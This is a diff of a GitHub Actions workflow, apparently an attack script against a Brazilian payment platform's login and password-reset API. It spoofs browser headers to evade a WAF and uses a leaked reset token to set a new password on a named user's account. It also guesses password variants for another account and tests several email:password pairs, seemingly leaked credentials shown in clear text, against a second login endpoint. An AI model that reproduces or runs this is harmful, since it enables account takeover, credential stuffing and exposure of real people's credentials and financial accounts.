@@ -1,4 +1,4 @@
-name: waf-reset-token-exploit
+name: waf-lenildo-reset
 on:
   workflow_dispatch:
 jobs:
@@ -6,10 +6,10 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        attempt: [1, 2, 3]
+        attempt: [1, 2, 3, 4, 5, 6, 7]
       fail-fast: false
     steps:
-    - name: Reset token exploit - attempt ${{ matrix.attempt }}
+    - name: attempt ${{ matrix.attempt }}
       run: |
         UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         BASE="https://wpdataservice.wisepay.com.br"
@@ -18,65 +18,74 @@ jobs:
         RESP_CHECK=$(curl -s -m 15 -A "$UA" \
           -H "Content-Type: application/json" \
           -H "Origin: https://portal.wisepay.com.br" \
-          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" \
+          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
           -H "type-application: web" \
           -X POST "$BASE/login" \
-          -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}' \
-          -w "\n%{http_code}")
-        BODY=$(echo "$RESP_CHECK" | head -1)
+          -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}')
         
-        if ! echo "$BODY" | grep -qE "(Unauthorized|success|Forbidden)"; then
+        if ! echo "$RESP_CHECK" | grep -qE "(Unauthorized|success|Forbidden)"; then
           echo "[${{ matrix.attempt }}] WAF blocking (IP: $MY_IP). Skip."
           exit 0
         fi
-        echo "[${{ matrix.attempt }}] WAF BYPASSED (IP: $MY_IP)"
+        echo "[${{ matrix.attempt }}] *** WAF BYPASSED (IP: $MY_IP) ***"
         
         echo ""
-        echo "=== Testar token de reset de lenildo (capturado no LeakRadar) ==="
-        LENILDO_TOKEN="39bf20e5965c0dcd2be2de52f030c8fd"
-        curl -v -s -m 15 -A "$UA" \
+        echo "=== Testar token de reset de lenildo ==="
+        RESP=$(curl -s -m 15 -A "$UA" \
           -H "Content-Type: application/json" \
           -H "type-application: web" \
           -H "Origin: https://portal.wisepay.com.br" \
           -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
-          -X PUT "$BASE/login/update-password/$LENILDO_TOKEN" \
+          -X PUT "$BASE/login/update-password/39bf20e5965c0dcd2be2de52f030c8fd" \
           -d '{"password":"Lenildo@2024!","password_confirmation":"Lenildo@2024!"}' \
-          -w "\nSTATUS:%{http_code}" 2>&1 | grep -E "(< HTTP|{.*}|STATUS)"
+          -w "\n%{http_code}")
+        CODE=$(echo "$RESP" | tail -1)
+        BODY=$(echo "$RESP" | head -1)
+        echo "PUT reset-token lenildo: $CODE | $BODY"
         
-        echo ""
-        echo "=== Se token válido -> login com nova senha ==="
-        curl -s -m 15 -A "$UA" \
-          -H "Content-Type: application/json" \
-          -H "Origin: https://portal.wisepay.com.br" \
-          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
-          -H "type-application: web" \
-          -X POST "$BASE/login" \
-          -d '{"email":"lenildo.silva@outlook.com","password":"Lenildo@2024!"}' \
-          -w "\nSTATUS:%{http_code}"
-        
-        echo ""
-        echo "=== Buscar /checkout/status para transactionCodes válidos ==="
-        for tid in "WP000001" "WP000002" "WP000003" "WP123456" "0000000001" "123456789"; do
-          RESP=$(curl -s -m 10 -A "$UA" \
+        if [ "$CODE" = "200" ]; then
+          echo "*** TOKEN VÁLIDO! Novo login: lenildo.silva@outlook.com:Lenildo@2024! ***"
+          curl -s -m 15 -A "$UA" \
+            -H "Content-Type: application/json" \
+            -H "Origin: https://portal.wisepay.com.br" \
+            -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
             -H "type-application: web" \
-            "$BASE/checkout/status/$tid" \
+            -X POST "$BASE/login" \
+            -d '{"email":"lenildo.silva@outlook.com","password":"Lenildo@2024!"}'
+        fi
+        
+        echo ""
+        echo "=== MAIS SENHAS para icelaserbelem (senha antiga pode ter variações) ==="
+        for PASS in "ICELASER2021" "Icelaser2021" "icelaser2021" "ICELASER@2021" "ICELASER2022" "ICELASER2023" "ICELASER2024" "IceLaser2021" "ICELASER!2021"; do
+          R=$(curl -s -m 10 -A "$UA" \
+            -H "Content-Type: application/json" \
+            -H "Origin: https://portal.wisepay.com.br" \
+            -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
+            -H "type-application: web" \
+            -X POST "$BASE/login" \
+            -d "{\"email\":\"icelaserbelem@gmail.com\",\"password\":\"$PASS\"}" \
             -w "\n%{http_code}")
-          CODE=$(echo "$RESP" | tail -1)
-          BODY=$(echo "$RESP" | head -1)
-          if [ "$CODE" != "404" ]; then
-            echo "CHECKOUT $tid: $CODE | $BODY"
+          RC=$(echo "$R" | tail -1)
+          if [ "$RC" = "200" ]; then
+            echo "*** SUCCESS icelaserbelem:$PASS ***"
+            echo "$R" | head -1
+          else
+            echo "$RC icelaserbelem:$PASS"
           fi
+          sleep 0.3
         done
         
         echo ""
-        echo "=== Buscar checkout/status com pattern analysis ==="
-        # Try common transation code formats
-        for tid in "WPTEST001" "WP20261125001" "TX123456" "PG000001"; do
-          RESP=$(curl -s -m 10 -A "$UA" \
+        echo "=== Builder login test ==="
+        for CRED in "fabiane@petcenterbrasil.com.br:08710871" "ce.iguatu@acqiofranchising.com.br:261297klBB*" "suporte@criatek.com.br:pbo@1006581"; do
+          EMAIL="${CRED%%:*}"
+          PASS="${CRED##*:}"
+          R=$(curl -s -m 10 -A "$UA" \
+            -H "Content-Type: application/json" \
             -H "type-application: web" \
-            "$BASE/checkout/status/$tid" \
+            -X POST "https://wpbuilderservices.wisepay.com.br/v1/login" \
+            -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
             -w "\n%{http_code}")
-          CODE=$(echo "$RESP" | tail -1)
-          BODY=$(echo "$RESP" | head -1)
-          echo "CHECKOUT $tid: $CODE | $(echo $BODY | head -c 100)"
+          RC=$(echo "$R" | tail -1)
+          echo "BUILDER $EMAIL: $RC | $(echo $R | head -1 | head -c 150)"
         done
